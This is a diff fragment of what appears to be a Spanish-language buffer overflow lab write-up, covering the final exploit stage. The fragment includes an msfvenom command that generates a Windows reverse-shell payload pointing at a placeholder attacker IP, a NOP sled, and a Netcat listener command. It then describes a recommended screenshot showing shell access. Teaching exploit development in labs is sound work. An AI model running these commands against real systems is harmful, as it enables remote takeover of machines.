@@ -63,6 +63,7 @@ Resultado: Encontramos una dirección de retorno válida. Al poner esta direcci�
 Llegamos a la fase final. Utilizamos Msfvenom para generar un Shellcode que nos proporcione una conexión inversa (Reverse Shell), asegurándonos de excluir los caracteres malos:
 
 msfvenom -p windows/shell_reverse_tcp LHOST=[TU_IP_KALI] LPORT=4444 -b "\x00\x0a\x0d" -f c
+
 Integramos este código en nuestro script de Python, añadimos un "colchón" de instrucciones NOP (\x90 * 16) para dar margen a la memoria, y ponemos nuestro Netcat a la escucha (nc -nlvp 4444). Lanzamos el exploit final.
 
 📸 CAPTURA RECOMENDADA 4: La terminal de Kali Linux mostrando tu Netcat recibiendo la conexión, con el prompt C:\Windows\System32> confirmando el acceso total al sistema.
